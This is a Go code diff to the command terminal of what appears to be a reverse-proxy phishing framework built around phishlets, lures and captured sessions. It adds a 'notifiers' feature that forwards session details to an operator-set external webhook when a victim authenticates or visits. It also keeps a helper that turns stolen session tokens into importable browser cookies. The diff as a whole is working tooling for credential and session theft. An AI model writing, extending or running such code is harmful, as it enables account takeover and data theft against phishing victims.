@@ -131,6 +131,12 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("config: %v", err)
 			}
+		case "notifiers":
+			cmd_ok = true
+			err := t.handleNotifiers(args[1:])
+			if err != nil {
+				log.Error("notifiers: %v", err)
+			}
 		case "proxy":
 			cmd_ok = true
 			err := t.handleProxy(args[1:])
@@ -391,7 +397,7 @@ func (t *Terminal) handleSessions(args []string) error {
 				}
 
 				if len(s.Tokens) > 0 {
-					json_tokens := t.tokensToJSON(pl, s.Tokens)
+					json_tokens := tokensToJSON(pl, s.Tokens)
 					t.output("%s\n", json_tokens)
 				} else {
 					t.output("\n")
@@ -570,6 +576,234 @@ func (t *Terminal) handlePhishlets(args []string) error {
 			}
 			log.Warning("`get-url` is deprecated - please use `lures` with custom `path` instead")
 			t.output("%s\n", out)
+			return nil
+		}
+	}
+	return fmt.Errorf("invalid syntax: %s", args)
+}
+
+func (t *Terminal) handleNotifiers(args []string) error {
+	higreen := color.New(color.FgHiGreen)
+	green := color.New(color.FgGreen)
+	//hired := color.New(color.FgHiRed)
+	hiblue := color.New(color.FgHiBlue)
+	yellow := color.New(color.FgYellow)
+	cyan := color.New(color.FgCyan)
+	hcyan := color.New(color.FgHiCyan)
+	white := color.New(color.FgHiWhite)
+
+	pn := len(args)
+	if pn == 0 {
+		// list all notifiers
+		t.output("%s", t.sprintNotifiers())
+		return nil
+	}
+	if pn > 0 {
+		switch args[0] {
+		case "create":
+			if pn == 4 {
+				_, err := url.ParseRequestURI(args[3])
+				if err != nil {
+					return fmt.Errorf("create: %v", err)
+				}
+				if t.cfg.IsValidNotifierOnEvent(args[1]) && t.cfg.IsValidNotifierMethod(args[2]) {
+					n := &Notify{
+						OnEvent: args[1],
+						Url:     args[3],
+						Method:  args[2],
+					}
+					t.cfg.AddNotifier(args[1], n)
+					log.Info("created notifier with ID: %d", len(t.cfg.notifiers)-1)
+					log.Info("disabled notifier with ID: %d", len(t.cfg.notifiers)-1)
+					return nil
+				}
+				return fmt.Errorf("create: invalid on_event: %s. use 'authenticated', 'visitor' or 'unauthorized'", args[1])
+			}
+			return fmt.Errorf("create: incorrect number of arguments. run 'help notifiers'")
+		case "edit":
+			n_id, err := strconv.Atoi(strings.TrimSpace(args[1]))
+			if err != nil {
+				return fmt.Errorf("edit: %v", err)
+			}
+			n, err := t.cfg.GetNotifier(n_id)
+			if err != nil {
+				return fmt.Errorf("edit: %v", err)
+			}
+
+			do_update := false
+			if pn == 3 {
+				switch args[2] {
+				case "enable":
+					n.Enabled = true
+					do_update = true
+					log.Info("enabled = '%v'", n.Enabled)
+				case "disable":
+					n.Enabled = false
+					do_update = true
+					log.Info("enabled = '%v'", n.Enabled)
+				}
+			}
+			if pn == 4 {
+				val := args[3]
+
+				switch args[2] {
+				case "on_event":
+					if val != "" {
+						val = strings.ToLower(val)
+						if !t.cfg.IsValidNotifierOnEvent(val) {
+							return fmt.Errorf("edit: notifier on_event is not valid. use 'authenticated', 'visitor' or 'unauthorized'")
+						}
+						n.OnEvent = val
+					} else {
+						n.OnEvent = ""
+					}
+					do_update = true
+					log.Info("on_event = '%s'", n.OnEvent)
+				case "url":
+					if val != "" {
+						_, err := url.ParseRequestURI(val)
+						if err != nil {
+							return err
+						}
+						n.Url = val
+					} else {
+						n.Url = ""
+					}
+					do_update = true
+					log.Info("url = '%s'", n.Url)
+				case "method":
+					if val != "" {
+						val = strings.ToUpper(val)
+						if !t.cfg.IsValidNotifierMethod(val) {
+							return fmt.Errorf("edit: notifier method is not valid. use 'POST' or 'GET'")
+						}
+						n.Method = val
+					} else {
+						n.Method = ""
+					}
+					do_update = true
+					log.Info("method = '%s'", n.Method)
+				case "auth_header_name":
+					if val != "" {
+						n.AuthHeaderName = val
+					} else {
+						n.AuthHeaderName = ""
+					}
+					do_update = true
+					log.Info("auth_header_name = '%s'", n.AuthHeaderName)
+				case "auth_header_value":
+					if val != "" {
+						n.AuthHeaderValue = val
+					} else {
+						n.AuthHeaderValue = ""
+					}
+					do_update = true
+					log.Info("auth_header_value = '%s'", n.AuthHeaderValue)
+				case "basic_auth_user":
+					if val != "" {
+						n.BasicAuthUser = val
+					} else {
+						n.BasicAuthUser = ""
+					}
+					do_update = true
+					log.Info("basic_auth_user = '%s'", n.BasicAuthUser)
+				case "basic_auth_password":
+					if val != "" {
+						n.BasicAuthPassword = val
+					} else {
+						n.BasicAuthPassword = ""
+					}
+					do_update = true
+					log.Info("basic_auth_password = '%s'", n.BasicAuthPassword)
+				case "forward_param":
+					if n.OnEvent == "visitor" {
+						if val != "" {
+							n.ForwardParam = val
+						} else {
+							n.ForwardParam = ""
+						}
+						do_update = true
+						log.Info("forward_param = '%s'", n.ForwardParam)
+					} else {
+						return fmt.Errorf("edit: ForwardParam is only implimented for the 'visitor' on_event")
+					}
+				}
+			}
+			if do_update {
+				err := t.cfg.SetNotifier(n_id, n)
+				if err != nil {
+					return fmt.Errorf("edit: %v", err)
+				}
+				return nil
+			}
+			return fmt.Errorf("edit: incorrect number of/or unknown arguments. run 'help notifiers'")
+		case "delete":
+			if pn == 2 {
+				if len(t.cfg.notifiers) == 0 {
+					break
+				}
+				if args[1] == "all" {
+					di := []int{}
+					for n, _ := range t.cfg.notifiers {
+						di = append(di, n)
+					}
+					if len(di) > 0 {
+						rdi := t.cfg.DeleteNotifier(di)
+						for _, id := range rdi {
+							log.Info("deleted notifier with ID: %d", id)
+						}
+					}
+					return nil
+				} else {
+					rc := strings.Split(args[1], ",")
+					di := []int{}
+					for _, pc := range rc {
+						pc = strings.TrimSpace(pc)
+						rd := strings.Split(pc, "-")
+						if len(rd) == 2 {
+							b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
+							if err != nil {
+								return fmt.Errorf("delete: %v", err)
+							}
+							e_id, err := strconv.Atoi(strings.TrimSpace(rd[1]))
+							if err != nil {
+								return fmt.Errorf("delete: %v", err)
+							}
+							for i := b_id; i <= e_id; i++ {
+								di = append(di, i)
+							}
+						} else if len(rd) == 1 {
+							b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
+							if err != nil {
+								return fmt.Errorf("delete: %v", err)
+							}
+							di = append(di, b_id)
+						}
+					}
+					if len(di) > 0 {
+						rdi := t.cfg.DeleteNotifier(di)
+						for _, id := range rdi {
+							log.Info("deleted lure with ID: %d", id)
+						}
+					}
+					return nil
+				}
+			}
+			return fmt.Errorf("incorrect number of arguments")
+		default:
+			n_id, err := strconv.Atoi(args[0])
+			if err != nil {
+				return err
+			}
+			n, err := t.cfg.GetNotifier(n_id)
+			if err != nil {
+				return err
+			}
+
+			keys := []string{"enabled", "on_event", "url", "method", "auth_header_name", "auth_header_value", "basic_auth_user", "basic_auth_password", "forward_param"}
+			vals := []string{hiblue.Sprint(n.Enabled), cyan.Sprint(n.OnEvent), hcyan.Sprint(n.Url), yellow.Sprint(n.Method), green.Sprint(n.AuthHeaderName), green.Sprint(n.AuthHeaderValue), higreen.Sprint(n.BasicAuthUser), higreen.Sprint(n.BasicAuthPassword), white.Sprint(n.ForwardParam)}
+			log.Printf("\n%s\n", AsRows(keys, vals))
+
 			return nil
 		}
 	}
@@ -1003,6 +1237,38 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("sessions", []string{"delete"}, "delete <id>", "delete logged session with <id> (ranges with separators are allowed e.g. 1-7,10-12,15-25)")
 	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")
 
+	h.AddCommand("notifiers", "general", "manage notifier configuration", "Configures notifier that pushes information about session on specifc events.", LAYER_TOP,
+		readline.PcItem("notifiers",
+			readline.PcItem("create", readline.PcItemDynamic(t.notifierValidOnEvents, readline.PcItemDynamic(t.notifierValidateMethods))),
+			readline.PcItem("edit",
+				readline.PcItemDynamic(t.notifierIdPrefixCompleter,
+					readline.PcItem("enable"),
+					readline.PcItem("disable"),
+					readline.PcItem("on_event", readline.PcItemDynamic(t.notifierValidOnEvents)),
+					readline.PcItem("method", readline.PcItemDynamic(t.notifierValidateMethods)),
+					readline.PcItem("url"),
+					readline.PcItem("auth_header_name"),
+					readline.PcItem("auth_header_value"),
+					readline.PcItem("basic_auth_user"),
+					readline.PcItem("basic_auth_password"),
+					readline.PcItem("forward_param"))),
+			readline.PcItem("delete", readline.PcItem("all"))))
+	h.AddSubCommand("notifiers", nil, "", "show all configuration variables")
+	h.AddSubCommand("notifiers", nil, "<id>", "show details of a notifier with a given <id>")
+	h.AddSubCommand("notifiers", []string{"create"}, "create <on_event> <method> <url>", "creates new notifier for given <on_event> that is send to <url> using <method>")
+	h.AddSubCommand("notifiers", []string{"delete"}, "delete <id>", "deletes notifier with given <id>")
+	h.AddSubCommand("notifiers", []string{"delete", "all"}, "delete all", "deletes all created notifier")
+	h.AddSubCommand("notifiers", []string{"edit", "enable"}, "edit <id> enable", "enables notifier with a given <id>")
+	h.AddSubCommand("notifiers", []string{"edit", "disable"}, "edit <id> enable", "disables notifier with a given <id>")
+	h.AddSubCommand("notifiers", []string{"edit", "on_event"}, "edit <id> on_event <on_event>", "sets the event <on_event> for a notifier with a given <id>")
+	h.AddSubCommand("notifiers", []string{"edit", "url"}, "edit <id> url <url>", "sets the url <url> for a notifier with a given <id>")
+	h.AddSubCommand("notifiers", []string{"edit", "method"}, "edit <id> method <url>", "sets the method <method> for a notifier with a given <id>")
+	h.AddSubCommand("notifiers", []string{"edit", "auth_header_name"}, "edit <id> auth_header_name <auth_header_name>", "sets the auth_header_name <auth_header_name> for a notifier with a given <id>")
+	h.AddSubCommand("notifiers", []string{"edit", "auth_header_value"}, "edit <id> auth_header_value <auth_header_value>", "sets the auth_header_value <auth_header_value> for a notifier with a given <id>")
+	h.AddSubCommand("notifiers", []string{"edit", "basic_auth_user"}, "edit <id> basic_auth_user <basic_auth_user>", "sets the basic_auth_user <basic_auth_user> for a notifier with a given <id>")
+	h.AddSubCommand("notifiers", []string{"edit", "basic_auth_password"}, "edit <id> basic_auth_password <basic_auth_user>", "sets the basic_auth_password <basic_auth_user> for a notifier with a given <id>")
+	h.AddSubCommand("notifiers", []string{"edit", "forward_param"}, "edit <id> forward_param <forward_param>", "sets the forward_param <forward_param> for a notifier with a given <id>")
+
 	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
 		/*		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"),
 				readline.PcItem("edit", readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("params"), readline.PcItem("template", readline.PcItemDynamic(t.emptyPrefixCompleter, readline.PcItemDynamic(t.templatesPrefixCompleter)))),
@@ -1042,45 +1308,6 @@ func (t *Terminal) createHelp() {
 		readline.PcItem("clear"))
 
 	t.hlp = h
-}
-
-func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]map[string]*database.Token) string {
-	type Cookie struct {
-		Path           string `json:"path"`
-		Domain         string `json:"domain"`
-		ExpirationDate int64  `json:"expirationDate"`
-		Value          string `json:"value"`
-		Name           string `json:"name"`
-		HttpOnly       bool   `json:"httpOnly,omitempty"`
-		HostOnly       bool   `json:"hostOnly,omitempty"`
-	}
-
-	var cookies []*Cookie
-	for domain, tmap := range tokens {
-		for k, v := range tmap {
-			c := &Cookie{
-				Path:           v.Path,
-				Domain:         domain,
-				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
-				Value:          v.Value,
-				Name:           k,
-				HttpOnly:       v.HttpOnly,
-			}
-			if domain[:1] == "." {
-				c.HostOnly = false
-				c.Domain = domain[1:]
-			} else {
-				c.HostOnly = true
-			}
-			if c.Path == "" {
-				c.Path = "/"
-			}
-			cookies = append(cookies, c)
-		}
-	}
-
-	json, _ := json.Marshal(cookies)
-	return string(json)
 }
 
 func (t *Terminal) checkStatus() {
@@ -1181,6 +1408,24 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 	return AsTable(cols, rows)
 }
 
+func (t *Terminal) sprintNotifiers() string {
+	higreen := color.New(color.FgHiGreen)
+	green := color.New(color.FgGreen)
+	//hired := color.New(color.FgHiRed)
+	hiblue := color.New(color.FgHiBlue)
+	yellow := color.New(color.FgYellow)
+	cyan := color.New(color.FgCyan)
+	hcyan := color.New(color.FgHiCyan)
+	white := color.New(color.FgHiWhite)
+	//n := 0
+	cols := []string{"id", "enabled", "on_event", "url", "method", "auth_header_name", "auth_header_value", "basic_auth_user", "basic_auth_password", "forward_param"}
+	var rows [][]string
+	for n, N := range t.cfg.notifiers {
+		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(N.Enabled), cyan.Sprint(N.OnEvent), hcyan.Sprint(N.Url), yellow.Sprint(N.Method), green.Sprint(N.AuthHeaderName), green.Sprint(N.AuthHeaderValue), higreen.Sprint(N.BasicAuthUser), higreen.Sprint(N.BasicAuthPassword), white.Sprint(N.ForwardParam)})
+	}
+	return AsTable(cols, rows)
+}
+
 func (t *Terminal) sprintLures() string {
 	higreen := color.New(color.FgHiGreen)
 	green := color.New(color.FgGreen)
@@ -1240,6 +1485,32 @@ func (t *Terminal) templatesPrefixCompleter(args string) []string {
 			}
 			ret = append(ret, name)
 		}
+	}
+	return ret
+}
+
+func (t *Terminal) notifierIdPrefixCompleter(args string) []string {
+	var ret []string
+	for n, _ := range t.cfg.notifiers {
+		ret = append(ret, strconv.Itoa(n))
+	}
+	return ret
+}
+
+func (t *Terminal) notifierValidOnEvents(args string) []string {
+	var ret []string
+	on_events := []string{"authenticated", "visitor", "unauthorized"}
+	for _, e := range on_events {
+		ret = append(ret, e)
+	}
+	return ret
+}
+
+func (t *Terminal) notifierValidateMethods(args string) []string {
+	var ret []string
+	on_events := []string{"GET", "POST"}
+	for _, e := range on_events {
+		ret = append(ret, e)
 	}
 	return ret
 }
